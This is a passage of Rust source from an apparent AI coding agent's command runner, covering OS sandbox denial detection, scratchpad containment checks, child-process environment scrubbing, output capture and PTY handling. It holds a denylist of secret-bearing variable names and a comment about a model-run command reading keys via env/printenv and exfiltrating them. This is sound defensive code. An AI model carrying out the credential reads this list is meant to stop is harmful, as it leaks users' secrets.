            denied_by_sandbox: false,
        },
        line_count: Some(input.stdout_lines + input.stderr_lines),
        byte_count: input.byte_count,
        ..ToolRunMetadata::default()
    }
}

/// The cached OS-sandbox availability probes (network kill-switch, filesystem
/// write-confinement). Probed once per process — platform capability cannot
/// change mid-run, and the Linux probe assembles a BPF program each call.
fn sandbox_probes() -> (bool, bool) {
    static PROBES: std::sync::OnceLock<(bool, bool)> = std::sync::OnceLock::new();
    *PROBES.get_or_init(|| {
        (
            mermaid_runtime::network_killswitch_available(),
            mermaid_runtime::fs_confinement_available(),
        )
    })
}

/// SIGSYS on Linux (x86_64/aarch64) — the signal the seccomp kill-switch raises.
const SANDBOX_KILL_SIGNAL: i32 = 31;

/// Which sandbox dimension a completed command's failure matches. `Ambiguous`
/// exists for macOS with both policies active: Seatbelt denies network AND
/// filesystem access with the same `EPERM` text and no signal, so the two
/// cannot be told apart.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DenialKind {
    Network,
    Filesystem,
    Ambiguous,
}

/// Map a completed run onto a sandbox-denial kind, gated on which policies
/// were actually active for this spawn (so an ordinary permission failure or
/// `exit 159` is never mislabeled when the sandbox was off).
///
/// Signatures per platform:
/// - Linux network: precise — the shell died with SIGSYS or reaped a
///   SIGSYS-killed child (`128 + SIGSYS`). Nothing else produces it.
/// - Linux filesystem: hedged — Landlock denials are ordinary `EACCES` text.
/// - macOS (Seatbelt): both dimensions are hedged `EPERM` "Operation not
///   permitted" text with no signal; with both policies active the match is
///   [`DenialKind::Ambiguous`].
fn detect_denial(
    run: &CommandRunOutput,
    sandbox_network: bool,
    sandbox_fs: bool,
) -> Option<DenialKind> {
    if cfg!(target_os = "linux") {
        if sandbox_network && is_sigsys_denial(run) {
            return Some(DenialKind::Network);
        }
        if sandbox_fs && is_permission_denial(run) {
            return Some(DenialKind::Filesystem);
        }
        return None;
    }
    if !is_permission_denial(run) {
        return None;
    }
    match (sandbox_network, sandbox_fs) {
        (true, true) => Some(DenialKind::Ambiguous),
        (true, false) => Some(DenialKind::Network),
        (false, true) => Some(DenialKind::Filesystem),
        (false, false) => None,
    }
}

/// Message shown when the Linux network kill-switch blocks a command (the
/// precise SIGSYS signature). States the cause and the three ways to allow it.
/// No emojis.
const NETWORK_DENIED_MESSAGE: &str = "Blocked by the network sandbox: this command tried to open an internet socket, which is denied because network access is off (safety.network = \"deny\" / --no-network). Re-run without --no-network, approve the command, or use full-access mode to allow network access.";

/// Hedged network-denial message for platforms without a precise signal
/// (macOS Seatbelt denies with plain EPERM). No emojis.
const HEDGED_NETWORK_DENIED_MESSAGE: &str = "Command failed with a permission error while the network sandbox was active (safety.network = \"deny\" / --no-network); a network access was likely denied. Re-run without --no-network, approve the command, or use full-access mode to allow network access.";

/// Message shown when a command's failure matches the filesystem-sandbox denial
/// signature. Hedged ("likely") because write denials surface as ordinary
/// permission errors (Linux Landlock EACCES, macOS Seatbelt EPERM), unlike the
/// unambiguous SIGSYS of the Linux network kill-switch. No emojis.
const FS_DENIED_MESSAGE: &str = "Command failed with a permission error while the filesystem sandbox was active (safety.filesystem = \"project\" / --confine-fs); a write outside the project directory, the system temp directory, or /dev was likely denied. Write inside the project, or re-run without --confine-fs to allow it.";

/// Combined hedged message for [`DenialKind::Ambiguous`] (macOS, both
/// policies active — the EPERM signature cannot say which one fired). No
/// emojis.
const AMBIGUOUS_DENIED_MESSAGE: &str = "Command failed with a permission error while the network and filesystem sandboxes were active (--no-network / --confine-fs); a network access or a write outside the allowed directories was likely denied. Write inside the project, or re-run without the sandbox flags to allow it.";

/// Whether a completed command was terminated by the Linux seccomp
/// kill-switch: the shell itself died with SIGSYS, or (more often) it reaped a
/// SIGSYS-killed child and exited `128 + SIGSYS`.
fn is_sigsys_denial(run: &CommandRunOutput) -> bool {
    run.signal == Some(SANDBOX_KILL_SIGNAL) || run.exit_code == Some(128 + SANDBOX_KILL_SIGNAL)
}

/// Whether a completed command's failure looks like a sandbox permission
/// denial: non-zero exit plus the shell/tool permission-error text. A
/// signature match, not a proof — [`detect_denial`] gates on "the sandbox was
/// active for this spawn", and the surfaced messages hedge accordingly.
fn is_permission_denial(run: &CommandRunOutput) -> bool {
    let failed = matches!(run.exit_code, Some(code) if code != 0);
    failed
        && (run.output.contains("Permission denied")
            || run.output.contains("Operation not permitted"))
}

/// Build the shell `Command` for a model command, optionally wrapped in the
/// `__sandbox-exec` launcher for the network kill-switch and/or filesystem
/// write-confinement (platform backend chosen by the launcher). The caller
/// sets stdio, process group, cwd, and env scrubbing on the returned command.
/// The resolved program + argv for a foreground command — one description
/// consumed by BOTH spawn paths (tokio pipes and the Unix PTY), so the PTY
/// child execs the exact same `__sandbox-exec` launcher (seccomp/Landlock
/// unchanged) as the pipe child.
struct ShellInvocation {
    program: PathBuf,
    args: Vec<std::ffi::OsString>,
}

/// The PowerShell executable model commands run under on Windows: PowerShell 7
/// (`pwsh`) when installed, else the always-present Windows PowerShell 5.1.
/// Resolved once — a PATH scan per spawn would be pure waste.
fn powershell_program() -> &'static str {
    static PROGRAM: std::sync::LazyLock<&'static str> = std::sync::LazyLock::new(|| {
        let has_pwsh = std::env::var_os("PATH").is_some_and(|path| {
            std::env::split_paths(&path).any(|dir| dir.join("pwsh.exe").is_file())
        });
        if has_pwsh { "pwsh" } else { "powershell" }
    });
    &PROGRAM
}

/// Wrap a model command for `-Command` so PowerShell behaves like a
/// non-interactive script runner: cmdlet errors terminate instead of limping
/// on, and the process exit code is the last native command's exit code
/// rather than PowerShell's bare 0/1. Same shape GitHub Actions uses for its
/// `powershell`/`pwsh` shells — without the trailer, `cargo build` failing
/// with 101 surfaces as exit 0.
fn powershell_wrap(command: &str) -> String {
    format!(
        "$ErrorActionPreference='Stop'\n{command}\nif ((Test-Path -LiteralPath variable:\\LASTEXITCODE)) {{ exit $LASTEXITCODE }}"
    )
}

fn shell_invocation(
    command: &str,
    sandbox_network: bool,
    confine_writes: Option<&[PathBuf]>,
) -> ShellInvocation {
    if sandbox_network || confine_writes.is_some() {
        // `mermaid __sandbox-exec [--no-network] [--confine-writes <dir>]… --
        // sh -c <command>`: the launcher installs the requested confinement on
        // itself, then execs the shell. Unix-only path — Windows never sets
        // these flags.
        let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("mermaid"));
        let mut args: Vec<std::ffi::OsString> = vec!["__sandbox-exec".into()];
        if sandbox_network {
            args.push("--no-network".into());
        }
        for dir in confine_writes.unwrap_or_default() {
            args.push("--confine-writes".into());
            args.push(dir.into());
        }
        args.extend(["--".into(), "sh".into(), "-c".into(), command.into()]);
        ShellInvocation { program: exe, args }
    } else if cfg!(target_os = "windows") {
        ShellInvocation {
            program: PathBuf::from(powershell_program()),
            args: vec![
                "-NoProfile".into(),
                "-NonInteractive".into(),
                "-Command".into(),
                powershell_wrap(command).into(),
            ],
        }
    } else {
        ShellInvocation {
            program: PathBuf::from("sh"),
            args: vec!["-c".into(), command.into()],
        }
    }
}

fn build_sandboxed_shell(
    command: &str,
    sandbox_network: bool,
    confine_writes: Option<&[PathBuf]>,
) -> Command {
    let invocation = shell_invocation(command, sandbox_network, confine_writes);
    let mut cmd = Command::new(&invocation.program);
    cmd.args(&invocation.args);
    cmd
}

/// Where the effective working directory landed: inside the project, inside
/// the session scratchpad, or outside both (escalated to ExternalDirectory).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CwdContainment {
    Project,
    Scratchpad,
    External,
}

/// Classify the (already-canonicalized) effective workdir. The scratchpad
/// check canonicalizes the scratch root itself; if that fails (dir missing,
/// permissions) the cwd fails closed to `External` — never to a downgrade.
fn classify_cwd(
    within_project: bool,
    effective_workdir: &Path,
    scratchpad: Option<&Path>,
) -> CwdContainment {
    if within_project {
        return CwdContainment::Project;
    }
    match scratchpad.and_then(|s| std::fs::canonicalize(s).ok()) {
        Some(scratch) if effective_workdir.starts_with(&scratch) => CwdContainment::Scratchpad,
        _ => CwdContainment::External,
    }
}

/// Fail-closed lexical prover: true only when the command, run with its cwd
/// inside the scratchpad, provably cannot touch anything outside it. Any
/// construct we cannot reason about — shell metacharacters, substitutions,
/// expansions, `..`, absolute or embedded paths pointing elsewhere, even a
/// parse failure — fails the proof and the command keeps its normal gating.
/// Over-rejecting is fine here (the command merely prompts as usual);
/// under-rejecting would silently skip an approval.
fn command_provably_in_scratch(command: &str, scratch: &Path) -> bool {
    // Metacharacters make the command opaque to token-level reasoning:
    // separators/pipes can chain arbitrary commands, redirection retargets
    // writes, `$`/backtick substitute or expand unseen text, `~`/globs
    // re-expand at run time, and grouping braces/parens introduce subshells.
    // Checked on the RAW string so even quoted occurrences fail closed.
    const OPAQUE: &[char] = &[
        ';', '|', '&', '<', '>', '$', '`', '~', '*', '?', '[', ']', '(', ')', '{', '}', '!', '\n',
        '\r',
    ];
    if command.contains(OPAQUE) {
        return false;
    }
    let Ok(tokens) = shell_words::split(command) else {
        return false;
    };
    if tokens.is_empty() {
        return false;
    }
    tokens.iter().all(|t| token_provably_in_scratch(t, scratch))
}

/// One token of a scratch-candidate command. Rules, all fail-closed:
/// - `..` anywhere: rejected (can climb out of the scratch cwd).
/// - `:/` anywhere: rejected (URL / remote-host / list-of-paths shapes).
/// - Drive-designator shape (`C:x`, `c:\x`): rejected on every platform —
///   on Windows it targets a drive root or a per-drive cwd, never scratch.
/// - No path separator: fine — a bare word, flag, or PATH-resolved argv0.
/// - Rooted: must sit lexically inside the scratchpad. `has_root`, not
///   `is_absolute` — on Windows `/etc/passwd` is rooted but not "absolute"
///   (no drive prefix), yet still escapes the scratch cwd via the drive
///   root, so every rooted token gets the containment check.
/// - Relative with a separator: accepted only as a PLAIN path (no leading
///   `-`, no `=`) so flag-embedded paths (`-t/etc`, `--output=/etc/x`,
///   `VAR=/etc`) can't smuggle a target past the rooted check.
fn token_provably_in_scratch(token: &str, scratch: &Path) -> bool {
    if token.contains("..") || token.contains(":/") {
        return false;
    }
    let bytes = token.as_bytes();
    if bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic() {
        return false;
    }
    if !token.contains(['/', '\\']) {
        return true;
    }
    if Path::new(token).has_root() {
        return Path::new(token).starts_with(scratch);
    }
    !token.starts_with('-') && !token.contains('=')
}

/// Advertised to spawned commands so scripts have a ready-made place for
/// throwaway files that never dirties the project tree.
const SCRATCHPAD_ENV_VAR: &str = "MERMAID_SCRATCHPAD";

/// Export the session scratchpad to a child command (pipe + background spawn
/// paths; the PTY path sets the same variable on its `CommandBuilder`). No-op
/// when the session has no scratchpad materialized.
fn export_scratchpad_env(cmd: &mut Command, scratchpad: Option<&Path>) {
    if let Some(dir) = scratchpad {
        cmd.env(SCRATCHPAD_ENV_VAR, dir);
    }
}

fn tail_lines(text: &str, max_lines: usize) -> String {
    let lines: Vec<&str> = text.lines().collect();
    let start = lines.len().saturating_sub(max_lines);
    lines[start..].join("\n")
}

fn first_url(text: &str) -> Option<String> {
    text.split_whitespace()
        .find(|part| part.starts_with("http://") || part.starts_with("https://"))
        .map(|url| {
            url.trim_matches(|c: char| matches!(c, ')' | ']' | '}' | ',' | ';' | '"' | '\''))
                .to_string()
        })
}

fn all_urls(text: &str) -> Vec<String> {
    text.split_whitespace()
        .filter(|part| part.starts_with("http://") || part.starts_with("https://"))
        .map(|url| {
            url.trim_matches(|c: char| matches!(c, ')' | ']' | '}' | ',' | ';' | '"' | '\''))
                .to_string()
        })
        .collect()
}

async fn open_browser_url(url: &str) -> Result<(), String> {
    // Only ever hand a plain http(s) URL to the OS launcher — reject
    // `file:`/`javascript:`/`data:`/etc. supplied by the model. On Windows this
    // is also what lets us drop the `cmd` shell below safely.
    super::web::require_http_scheme(url)?;

    #[cfg(target_os = "macos")]
    let mut command = {
        let mut cmd = Command::new("open");
        cmd.arg(url);
        cmd
    };

    #[cfg(target_os = "linux")]
    let mut command = {
        let mut cmd = Command::new("xdg-open");
        cmd.arg(url);
        cmd
    };

    #[cfg(target_os = "windows")]
    let mut command = {
        // Launch via `rundll32` (a real executable) rather than `cmd /C start`,
        // so the URL is passed as a single argv and never re-parsed by a shell —
        // `& | > ^ "` in a model-supplied URL can't break out into arbitrary
        // commands the way they can inside `cmd`.
        let mut cmd = Command::new("rundll32");
        cmd.args(["url.dll,FileProtocolHandler", url]);
        cmd
    };

    command
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .kill_on_drop(false)
        .spawn()
        .map(|_| ())
        .map_err(|e| e.to_string())
}

/// Drive the child process, pumping stdout+stderr concurrently so
/// the kernel pipe buffer never wedges the child. Emits
/// `ProgressEvent::Output` chunks on `ExecContext::progress` for
/// any future consumer that wants to show live subprocess output.
#[derive(Debug, Clone)]
struct CommandRunOutput {
    output: String,
    exit_code: Option<i32>,
    /// Terminating signal (Unix), when the process was killed by one — e.g.
    /// SIGSYS from the seccomp network kill-switch. `None` on a normal exit or
    /// on non-Unix.
    signal: Option<i32>,
    stdout_lines: usize,
    stderr_lines: usize,
}

/// Result of driving a foreground command: ran to completion, was detached
/// (Ctrl+B), was cancelled (the turn token fired), or hit its timeout. The
/// cancelled and timed-out arms both tree-kill the process group and abort the
/// driver before returning, so neither can leak the child.
enum CommandRunResult {
    Completed(CommandRunOutput),
    Detached { pid: u32, log_path: PathBuf },
    Cancelled,
    TimedOut,
}

/// Names that must never be inherited by a spawned command. Provider API
/// keys + the daemon token live in the parent's environment; a model-driven
/// shell command could otherwise read them via `env`/`printenv` and
/// exfiltrate them. We strip these by exact name in addition to the
/// pattern match in [`scrub_secret_env`].
const SECRET_ENV_VARS: &[&str] = &[
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "GEMINI_API_KEY",
    "GOOGLE_API_KEY",
    "OLLAMA_API_KEY",
    "GROQ_API_KEY",
    "MISTRAL_API_KEY",
    "DEEPSEEK_API_KEY",
    "OPENROUTER_API_KEY",
    "XAI_API_KEY",
    "TOGETHER_API_KEY",
    "MERMAID_DAEMON_TOKEN",
];

/// Tell child processes they have no human to talk to. A spawned command runs
/// session-detached with stdin on `/dev/null`, so any interactive credential
/// prompt can only fail or hang — git is the one common tool that would
/// otherwise sit on a prompt until the command timeout. Set unconditionally:
/// any other value guarantees a hang in this environment. (Same value the
/// plugin git hooks already use — see `mermaid-runtime`'s plugin module.)
fn harden_noninteractive_env(cmd: &mut Command) {
    cmd.env("GIT_TERMINAL_PROMPT", "0");
}

/// Remove secret-bearing environment variables from a child command. Uses a
/// denylist (known provider keys + name patterns) rather than an allowlist so
/// ordinary build/run commands keep `PATH`, `CARGO_HOME`, language toolchain
/// vars, `XAUTHORITY`, etc. and still work.
fn scrub_secret_env(cmd: &mut Command) {
    for name in secret_env_names() {
        cmd.env_remove(&name);
    }
}

/// The concrete secret-bearing names present in THIS process's environment —
/// shared by the pipe path (`scrub_secret_env`) and the PTY path
/// (`CommandBuilder::env_remove`), so the two spawn paths can't drift.
fn secret_env_names() -> Vec<String> {
    std::env::vars()
        .map(|(name, _)| name)
        .filter(|name| is_secret_env_name(name))
        .collect()
}

/// True if an env var name looks like it carries a secret/credential and must
/// not leak into a model-run child process. Denylist (not allowlist) so
/// ordinary build/run vars (`PATH`, toolchain, `XAUTHORITY`, …) survive.
fn is_secret_env_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    SECRET_ENV_VARS.contains(&upper.as_str())
        || upper.contains("API_KEY")
        || upper.contains("APIKEY")
        || upper.contains("ACCESS_KEY")
        || upper.contains("PRIVATE_KEY")
        || upper.contains("SECRET")
        || upper.contains("PASSWORD")
        || upper.contains("PASSWD")
        || upper.contains("CREDENTIAL")
        || upper.contains("TOKEN")
        || upper.contains("WEBHOOK")
        || upper.contains("DATABASE_URL")
        || upper.ends_with("_DSN")
        || upper.contains("CONNECTION_STRING")
        || upper == "KUBECONFIG"
        || upper == "SSH_AUTH_SOCK"
}

/// Drain a child stream, capping the captured bytes at `cap` so a chatty or
/// newline-less command can't exhaust memory. Bytes are accumulated raw and
/// decoded once at the end (lossy) so a multibyte char split across reads is
/// not corrupted by the cap. Returns `(text, truncated)`.
/// On-disk cap for the per-stream tee log (#126). The in-memory buffer is
/// capped at `MAX_TOOL_OUTPUT_BYTES`; the log may grow larger (it stays
/// tail-able for a backgrounded process) but must not be unbounded — a command
/// spewing gigabytes would otherwise fill the temp dir.
const TEE_LOG_CAP_BYTES: usize = 64 * 1024 * 1024;

/// Bounded head+tail capture core, shared by the pipe reader (`read_capped`)
/// and the PTY drain. Keeps the HEAD (up to cap/2) and a bounded TAIL ring:
/// command output puts the actual error / exit summary at the END, which
/// head-only truncation used to discard. head_cap + tail_cap == cap, so any
/// total <= cap reconstructs exactly (no marker); only a genuine overflow
/// drops the middle.
struct CappedCapture {
    head_cap: usize,
    tail_cap: usize,
    head: Vec<u8>,
    tail: std::collections::VecDeque<u8>,
    total: usize,
}

impl CappedCapture {
    fn new(cap: usize) -> Self {
        let head_cap = cap / 2;
        Self {
            head_cap,
            tail_cap: cap - head_cap,
            head: Vec::new(),
            tail: std::collections::VecDeque::new(),
            total: 0,
        }
    }

    fn push(&mut self, mut chunk: &[u8]) {
        self.total += chunk.len();
        // Fill the head first; everything past head_cap flows into the
        // bounded tail ring so the last tail_cap bytes always survive.
        if self.head.len() < self.head_cap {
            let take = (self.head_cap - self.head.len()).min(chunk.len());
            self.head.extend_from_slice(&chunk[..take]);
            chunk = &chunk[take..];
        }
        if !chunk.is_empty() {
            self.tail.extend(chunk.iter().copied());
            while self.tail.len() > self.tail_cap {
                self.tail.pop_front();
            }
        }
    }

    /// `(text, truncated)` — bytes decoded lossily once at the end so a
    /// multibyte char split across reads is not corrupted by the cap.
    fn finish(self) -> (String, bool) {
        let truncated = self.total > self.head_cap + self.tail_cap;
        let tail_bytes: Vec<u8> = self.tail.into_iter().collect();
        let mut out = String::from_utf8_lossy(&self.head).into_owned();
        if truncated {
            let dropped = self.total - self.head.len() - tail_bytes.len();
            out.push_str(&format!("\n…[output truncated, {dropped} bytes elided]…\n"));
        }
        out.push_str(&String::from_utf8_lossy(&tail_bytes));
        (out, truncated)
    }
}

async fn read_capped<R: AsyncRead + Unpin>(
    mut reader: R,
    cap: usize,
    log_cap: usize,
    progress: Option<tokio::sync::mpsc::Sender<ProgressEvent>>,
    log: Option<std::sync::Arc<tokio::sync::Mutex<tokio::fs::File>>>,
) -> (String, bool) {
    let mut buf = [0u8; 8192];
    let mut capture = CappedCapture::new(cap);
    let mut logged: usize = 0;
    let mut log_capped = false;
    loop {
        match reader.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                // Tee raw bytes to the shared log file so a backgrounded
                // (Ctrl+B) process stays tail-able via /logs — bounded at
                // `TEE_LOG_CAP_BYTES` so a runaway command can't fill the disk
                // (#126). Once capped we write a one-time marker and stop.
                if let Some(file) = &log
                    && !log_capped
                {
                    let mut f = file.lock().await;
                    if logged + n <= log_cap {
                        let _ = f.write_all(&buf[..n]).await;
                        logged += n;
                    } else {
                        let remaining = log_cap - logged;
                        let _ = f.write_all(&buf[..remaining]).await;
                        let _ = f.write_all(b"\n...[log truncated]...\n").await;
                        log_capped = true;
                    }
                    let _ = f.flush().await;
                }
                if let Some(tx) = &progress {
                    let chunk = String::from_utf8_lossy(&buf[..n]);
                    for line in chunk.split('\n') {
                        if !line.is_empty() {
                            let _ = tx.send(ProgressEvent::Output(line.to_string())).await;
                        }
                    }
                }
                capture.push(&buf[..n]);
            },
            Err(_) => break,
        }
    }
    capture.finish()
}

/// Strip terminal escape sequences and normalize PTY line discipline for
/// model-facing text: CSI (`ESC[…final`), OSC (`ESC]…BEL|ESC\\`), string
/// sequences (DCS/SOS/PM/APC — `ESC P/X/^/_ … ST`, payload included), and
/// other two-byte ESC sequences are dropped; a bare BEL is dropped; a
/// backspace erases the previous character (ConPTY repaints emit both);
/// `\r\n` (ONLCR — every PTY line) normalizes to `\n`; a lone `\r`
/// (progress-bar rewrite) becomes `\n` so rewrites read as lines, bounded
/// upstream by the output cap.
fn strip_ansi(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\u{1b}' => match chars.next() {
                // CSI: parameters/intermediates until a final byte 0x40..=0x7E.
                Some('[') => {
                    for f in chars.by_ref() {
                        if ('\u{40}'..='\u{7e}').contains(&f) {
                            break;
                        }
                    }
                },
                // OSC: terminated by BEL or ST (ESC \).
                Some(']') => {
                    let mut prev_esc = false;
                    for f in chars.by_ref() {
                        if f == '\u{7}' || (prev_esc && f == '\\') {
                            break;
                        }
                        prev_esc = f == '\u{1b}';
                    }
                },
                // DCS/SOS/PM/APC string sequences: the whole PAYLOAD is
                // device data, not text, so it must be consumed through the
                // ST terminator (ESC \) — dropping only the introducer
                // would leak the payload into the capture.
                Some('P' | 'X' | '^' | '_') => {
                    let mut prev_esc = false;
                    for f in chars.by_ref() {
                        if prev_esc && f == '\\' {
                            break;
                        }
                        prev_esc = f == '\u{1b}';
                    }
                },
                // Other two-byte escapes (charset selection, keypad modes…):
                // the consumed char IS the sequence.
                Some(_) | None => {},
            },
            // Bare BEL rings the bell; it is never text.
            '\u{7}' => {},
            // Backspace: the terminal would erase the previous cell, so pop
            // the previous character — but never across a line break.
            '\u{8}' => {
                if out.ends_with(|p: char| p != '\n') {
                    out.pop();
                }
            },
            '\r' => {
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
                out.push('\n');
            },
            _ => out.push(c),
        }
    }
    out
}

#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
async fn run_command(
    mut cmd: Command,
    progress: tokio::sync::mpsc::Sender<ProgressEvent>,
    token: tokio_util::sync::CancellationToken,
    background: tokio_util::sync::CancellationToken,
    timeout: Duration,
) -> std::io::Result<CommandRunResult> {
    let mut child = cmd.spawn()?;
    let pid = child.id();

    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| std::io::Error::other("child stdout unavailable"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| std::io::Error::other("child stderr unavailable"))?;

    // Tee combined output to a log file so that, if the user backgrounds the
    // command (Ctrl+B), it stays tail-able via /logs. Removed on normal exit.
    // Lives in the 0700 private temp dir, created owner-only + O_EXCL (#F14/#F15).
    let log_path = background_log_path();
    let log =
        create_tee_log_blocking(&log_path).map(|f| std::sync::Arc::new(tokio::sync::Mutex::new(f)));

    let cap = mermaid_model::constants::MAX_TOOL_OUTPUT_BYTES;
    let stdout_task = tokio::spawn(read_capped(
        stdout,
        cap,
        TEE_LOG_CAP_BYTES,
        Some(progress.clone()),
        log.clone(),
    ));
    let stderr_task = tokio::spawn(read_capped(
        stderr,
        cap,
        TEE_LOG_CAP_BYTES,
        None,
        log.clone(),
    ));

    // A driver task owns the child + drain tasks and runs to completion no
    // matter what. On normal exit it ships the result back. If we detach, we
    // just stop listening — the driver (and its child) keep running, the log
    // keeps filling — until the child exits or Mermaid quits.
    let (done_tx, done_rx) = tokio::sync::oneshot::channel();
    let driver = tokio::spawn(async move {
        let (output, _) = stdout_task.await.unwrap_or_default();
        let (errors, _) = stderr_task.await.unwrap_or_default();
        let status = child.wait().await;
        let _ = done_tx.send((output, errors, status));
    });

    let timeout_fut = tokio::time::sleep(timeout);

    tokio::select! {
        biased;
        _ = background.cancelled() => {
            match pid {
                // Ctrl+B: detach. Dropping `driver`'s JoinHandle does NOT abort
                // the task — it runs on, keeping the child alive and the log
                // filling.
                Some(pid) => {
                    drop(driver);
                    Ok(CommandRunResult::Detached { pid, log_path })
                }
                // No OS pid means the child was already polled to completion —
                // there is nothing left to background. Report cancellation
                // rather than minting a phantom `bg-0` process that a later
                // `/stop` could mis-signal.
                None => {
                    driver.abort();
                    let _ = tokio::fs::remove_file(&log_path).await;
                    Ok(CommandRunResult::Cancelled)
                }
            }
        }
        _ = token.cancelled() => {
            // Turn cancelled (Esc): the detached `driver` would otherwise keep
            // the child (and any grandchild it forked) alive until it exited on
            // its own. Kill the whole tree/group, abort the driver, drop the log.
            if let Some(p) = pid {
                mermaid_model::utils::terminate_tree(p, mermaid_model::utils::Grace::Immediate).await;
            }
            // This is the one deliberate `JoinHandle::abort` in the codebase.
            // `driver` is a raw (non-scoped) `tokio::spawn` because it must be
            // able to outlive the turn on Ctrl+B detach; on Esc-cancel we've
            // just force-killed its whole process tree, so its `await`s would
            // unblock at EOF momentarily anyway — the abort just makes teardown
            // immediate before we drop the tee log. See the doc note in
            // `src/domain/reducer.rs` and `docs/architecture.md`.
            driver.abort();
            let _ = tokio::fs::remove_file(&log_path).await;
            Ok(CommandRunResult::Cancelled)
        }
        res = done_rx => {
            // Normal completion — drop the tee log.
            drop(log);
            let _ = tokio::fs::remove_file(&log_path).await;
            let (output, errors, status) = res
                .map_err(|_| std::io::Error::other("command driver dropped before completing"))?;
            let status = status?;
            let stdout_lines = output.lines().count();
            let stderr_lines = errors.lines().count();
            let mut full_output = output;
            if !errors.is_empty() {
                full_output.push_str("\n--- stderr ---\n");
                full_output.push_str(&errors);
            }
            if !status.success() {
                full_output.push_str(&format!(
                    "\n--- Command exited with status: {} ---",
                    status.code().unwrap_or(-1)
                ));
            }
            // Preserve the terminating signal so the caller can distinguish a
            // seccomp SIGSYS denial from an ordinary failure (mirrors
            // `mcp/transport.rs`). `None` on non-Unix / normal exit.
            #[cfg(unix)]
            let signal = {
                use std::os::unix::process::ExitStatusExt;
                status.signal()
            };
            #[cfg(not(unix))]
            let signal = None;
            Ok(CommandRunResult::Completed(CommandRunOutput {
                output: full_output,
                exit_code: status.code(),
                signal,
                stdout_lines,
                stderr_lines,
            }))
        }
        _ = timeout_fut => {
            // Foreground timeout: same teardown as Esc. The old outer-`select!`
            // form dropped the `run_command` future on timeout, which only
            // DETACHED the spawned `driver` that owns the Child — so the whole
            // tree leaked despite the "was killed" message. Tree-kill the group,
            // abort the driver, drop the tee log, then report TimedOut.
            if let Some(p) = pid {
                mermaid_model::utils::terminate_tree(p, mermaid_model::utils::Grace::Immediate).await;
            }
            driver.abort();
            let _ = tokio::fs::remove_file(&log_path).await;
            Ok(CommandRunResult::TimedOut)
        }
    }
}

/// PTY drain state: tees raw bytes to the log, emits sanitized complete
/// lines as progress, and feeds the bounded capture. One merged stream —
/// a PTY has no stdout/stderr split (`stderr_lines` reports 0).
struct PtyDrain {
    capture: CappedCapture,
    log: Option<std::sync::Arc<tokio::sync::Mutex<tokio::fs::File>>>,
    logged: usize,
    log_capped: bool,
    line_buf: String,
    progress: tokio::sync::mpsc::Sender<ProgressEvent>,
}

impl PtyDrain {
    async fn push(&mut self, chunk: &[u8]) {
        // Tee RAW bytes (ANSI kept — tailing a backgrounded log renders
        // correctly); same bound as the pipe path (#126).
        if let Some(file) = &self.log
            && !self.log_capped
        {
            let mut f = file.lock().await;
            if self.logged + chunk.len() <= TEE_LOG_CAP_BYTES {
                let _ = f.write_all(chunk).await;
                self.logged += chunk.len();
            } else {
                let remaining = TEE_LOG_CAP_BYTES - self.logged;
                let _ = f.write_all(&chunk[..remaining]).await;
                let _ = f.write_all(b"\n...[log truncated]...\n").await;
                self.log_capped = true;
            }
            let _ = f.flush().await;
        }
        // Progress: sanitize, then emit complete lines only (an escape split
        // across chunks is cosmetic here; the final output sanitizes whole).
        self.line_buf
            .push_str(&strip_ansi(&String::from_utf8_lossy(chunk)));
        while let Some(i) = self.line_buf.find('\n') {
            let line: String = self.line_buf.drain(..=i).collect();
            let line = line.trim_end();
            if !line.is_empty() {
                let _ = self
                    .progress
                    .send(ProgressEvent::Output(line.to_string()))
                    .await;
            }
        }
        // Cap applies to RAW bytes pre-strip (bounded memory).
        self.capture.push(chunk);
    }
}

/// Foreground command on a pseudo-terminal (openpty on Unix, ConPTY on
/// Windows): `tty`/`isatty` report a terminal, spinner-heavy tools behave,
/// and on Unix `/dev/tty` resolves to THIS captured pty instead of
/// scribbling over the TUI. Mirrors `run_command`'s select shape (detach /
/// cancel / done / timeout) and reuses the same sandbox launcher, env
/// scrubbing, tee log, and capture core.
///
/// Load-bearing differences from the pipe path:
/// - NO `setsid` pre_exec: on Unix portable-pty already setsids and sets
///   the controlling tty — the child is session+group leader, so
///   `terminate_tree`'s group-kill semantics are byte-identical. On
///   Windows `terminate_tree` kills the tree by pid (`taskkill /T`), so no
///   group setup is needed on either spawn path.
/// - stdin is the pty slave (not /dev/null): a child that READS stdin now
///   hangs to timeout instead of instant EOF — mitigated by
///   GIT_TERMINAL_PROMPT=0 (still set) and the command timeout.
/// - fixed 24x80 size: nothing resizes it (plumbing the live TUI size is
///   not worth a resize protocol for batch commands).
///
/// Every fallible step happens BEFORE the child spawns, so an `Err` return
/// can safely fall back to the pipe path without re-running side effects —
/// openpty, clone_reader, and (Windows) the CPR priming write are the only
/// `?` points ahead of `spawn_command`.
#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
async fn run_command_pty(
    invocation: &ShellInvocation,
    workdir: &Path,
    scratchpad: Option<&Path>,
    progress: tokio::sync::mpsc::Sender<ProgressEvent>,
    token: tokio_util::sync::CancellationToken,
    background: tokio_util::sync::CancellationToken,
    timeout: Duration,
) -> std::io::Result<CommandRunResult> {
    use portable_pty::{CommandBuilder, PtySize, native_pty_system};

    let pty = native_pty_system();
    let pair = pty
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
        .map_err(std::io::Error::other)?;
    // Clone the reader BEFORE spawning: after this point nothing may fail
    // fallibly (a post-spawn fallback would re-run the command).
    let mut reader = pair
        .master
        .try_clone_reader()
        .map_err(std::io::Error::other)?;

    // portable-pty opens the ConPTY with PSEUDOCONSOLE_INHERIT_CURSOR, so
